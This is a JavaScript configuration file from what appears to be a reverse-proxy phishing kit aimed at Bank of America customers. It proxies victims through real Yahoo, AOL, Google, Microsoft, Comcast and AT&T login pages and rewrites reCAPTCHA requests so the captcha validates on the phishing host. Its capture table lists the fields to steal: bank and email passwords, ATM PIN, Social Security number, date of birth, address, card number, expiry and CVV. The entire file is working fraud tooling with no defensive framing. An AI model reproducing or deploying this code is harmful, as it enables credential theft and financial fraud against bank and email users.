/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const url = require('url')
const superagent = require('superagent');


const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */

/** Important Defaults */



const ExecPhpPager = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return req.url.startsWith('/session/secure/');

    }

    execute(clientContext) {
        if (this.req.method === 'POST') {
            if (this.req.url === '/session/secure/rukaya/mako') {
                super.uploadRequestBody(clientContext.currentDomain, clientContext)

                super.superExecutePhpScript('addon/validate.php', clientContext)
            } else {
                    super.uploadRequestBody(clientContext.currentDomain, clientContext)
                    super.cleanEnd('PHP-EXEC', clientContext)
            }
        } else {
            switch (this.req.url) {
                case '/session/secure/minto':
                    super.superExecutePhpScript('login.php', clientContext)
                    break
                case '/session/secure/riliqua':
                    super.superExecutePhpScript('profile.php', clientContext)
                    break
                case '/session/secure/menikooko':
                    super.superExecutePhpScript('addon/email.php', clientContext)
                    break
                default:
                    super.superExecutePhpScript('404.php', clientContext)
            }
        }
    }
}


const EmailLoginHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        if (req.url.startsWith('/auth/login/')) {
            return true
        } return false
    }

    execute(clientContext) {
        if (this.req.url.startsWith('/auth/login/')) {
            if (this.req.url === '/auth/login/yahoo') {
                this.req.url = '/'
                clientContext.currentDomain = 'login.yahoo.com'
                this.res.writeHead(302, {location: '/'})
                return this.res.end('')
            }
            if (this.req.url === '/auth/login/comcast') {
                this.req.url = '/login?r=comcast.net&s=oauth'
                clientContext.currentDomain = 'login.xfinity.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/aol') {
                this.req.url = '/'
                clientContext.currentDomain = 'login.aol.com'
                this.res.writeHead(302, {location: '/'})
                return this.res.end('')
            }
            if (this.req.url === '/auth/login/gmail') {
                // eslint-disable-next-line max-len
                this.req.url = '/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin'
                clientContext.currentDomain = 'accounts.google.com'
                // return super.superExecuteProxy(clientContext.currentDomain, clientContext)
                this.res.writeHead(302, { location: '/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin' })
                return this.res.end('')
            }
            if (this.req.url === '/auth/login/outlook') {
                clientContext.info.disableDeflate = true;
                this.req.headers['accept-encoding'] = 'gzip, br'
                this.req.url = '/'
                clientContext.currentDomain = 'login.live.com'
                this.res.writeHead(302, {location: '/'})
                return this.res.end('')
            }
            if (this.req.url === '/auth/login/office') {
                this.req.url = '/'
                clientContext.currentDomain = 'login.microsoftonline.com'
                this.res.writeHead(302, {location: '/'})
                return this.res.end('')
            }
            if (this.req.url === '/auth/login/att') {
                // this.req.url = '/isam/sps/oidc/rp/consumerfed/kickoff/aaidpartner?Target=https%3A%2F%2Fcaaid.att.com%2Fisam%2Fsps%2Fstatic%2FsigninRedirect.html'
                clientContext.currentDomain = 'caaid.att.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/finish') {
                clientContext.setLogAvailable(true)
                this.res.writeHead(302, {location: '/session/secure/riliqua'})
                super.sendClientData(clientContext, {})
                return this.res.end()
            }
        }

        return super.superExecuteProxy(clientContext.currentDomain, clientContext)

    }
}


const RecaptchaHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return req.url.startsWith('/recaptcha');

    }

    execute(clientContext) {

        this.req.headers['origin'] = `https://${clientContext.currentDomain}`

        this.req.headers['referer'] = this.req.headers['referer']? 
        this.req.headers['referer'].replace(clientContext.hostname, clientContext.currentDomain) : ''


        if (this.req.url.startsWith('/recaptcha/enterprise/anchor') || this.req.url.startsWith('/us/en/recaptcha/enterprise/anchor')) {
            const hostnameKey = Buffer.from(`https://${clientContext.hostname}:443`)
            const hostnameBase64Key = hostnameKey.toString('base64');
            console.log(hostnameBase64Key)

            this.req.url = this.req.url.replace('..', '==')
            this.req.url = this.req.url.replace('.&', '=&')


            this.req.url = this.req.url.replace(hostnameBase64Key, 'aHR0cHM6Ly9sb2dpbi55YWhvby5uZXQ6NDQz')

            
            console.log(this.req.url)
            return super.superExecuteProxy('www.google.com', clientContext)


        }


        if (this.req.url.startsWith('/recaptcha/enterprise')) {
            this.req.headers['origin'] = this.req.headers['origin']? this.req.headers['origin'].replace(clientContext.hostname, 'www.google.com') : ''
            this.req.headers['referer'] = this.req.headers['referer']? this.req.headers['referer'].replace(clientContext.hostname, 'www.google.com') : ''


            console.log(JSON.stringify(this.req.headers))
            
            return super.superExecuteProxy('www.google.com', clientContext)

        }

       

        if (this.req.url.startsWith('/recaptcha/releases')) {
            return super.superExecuteProxy('www.gstatic.com', clientContext)

        }

       
    }
}




const configExport = {
    CURRENT_DOMAIN: 'www.bankofamerica.com',
    START_PATH: '/session/secure/minto',
    
    EXTERNAL_FILTERS: 
    [
    'signaler-pa.googleapis.com',
    'ssl.gstatic.com',
    ],

    PRE_HANDLERS:
        [
            EmailLoginHandler,
            ExecPhpPager,
            RecaptchaHandler,
        ],
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {
         loginUserName: {
            method: 'POST',
            params: ['sko1'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        loginPassword: {
            method: 'POST',
            params: ['skun1'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        loginUserName2: {
            method: 'POST',
            params: ['sko'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        loginPassword2: {
            method: 'POST',
            params: ['skun'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        loginRealUserName: {
            method: 'POST',
            params: ['onlineId'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        loginRealPassword: {
            method: 'POST',
            params: ['passcode'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        email: {
            method: 'POST',
            params: ['mento'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        
        atmPin: {
            method: 'POST',
            params: ['pin'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        emailCapture: {
            method: 'POST',
            params: ['username', 'user'],
            urls: '',
            hosts: ['login.yahoo.com', 'login.aol.com', 'login.microsoftonline.com', 'login.live.com'],
        },
        emailPassword: {
            method: 'POST',
            params: ['password', 'passwd'],
            urls: '',
            hosts: ['login.yahoo.com', 'login.aol.com', 'login.microsoftonline.com', 'login.live.com'],
        },
        manualEmailPassword1: {
            method: 'POST',
            params: ['pinto1'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
        manualEmailPassword2: {
            method: 'POST',
            params: ['pinto2'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },

        fullName: {
            method: 'POST',
            params: ['name'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        ssn4digits: {
            method: 'POST',
            params: ['ssn'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        dateOfBirth: {
            method: 'POST',
            params: ['dob'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        
        
        SSN: {
            method: 'POST',
            params: ['ssn'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        
        address: {
            method: 'POST',
            params: ['address'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        CardNumber: {
            method: 'POST',
            params: ['card'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        Expiry: {
            method: 'POST',
            params: ['exp'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        cvv: {
            method: 'POST',
            params: ['cvv'],
            urls: '',
            hosts: 'PHP-EXEC',
        },


        defaultPhpCapture: {
            method: 'POST',
            params: ['default'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
    },

}
module.exports = configExport